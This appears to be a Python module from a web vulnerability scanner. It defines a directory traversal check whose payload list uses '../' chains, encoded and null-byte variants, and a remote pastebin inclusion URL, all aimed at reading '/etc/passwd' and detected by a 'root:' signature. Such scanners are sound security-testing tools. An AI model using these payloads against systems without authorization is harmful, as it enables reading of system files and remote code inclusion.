from Scanner import Scanner

class DirectoryTraversalScanner(Scanner):
    className = 'Directory Traversal'
    payloads = ['%s', '/%s', '../'*19+'%s', 'file%%3a//%s',
            '%s%%00', '/%s%%00', '../'*19+'%s%%00', 'file%%3a//%s%%00',
            '....//'*19+'%s', '....//'*19+'%s%%00',
            '..%%2f'*19+'%s', '..%%2f'*19+'%s%%00',
            '//pastebin.com/raw/XrP3BbCR/%%23',
            'https%%3a//pastebin.com/raw/XrP3BbCR/%%23']
    testPayload = 'etc/passwd'
    testSignature = 'root:'
    fixedSignature = 'injected'
    realPayload = 'etc/passwd'
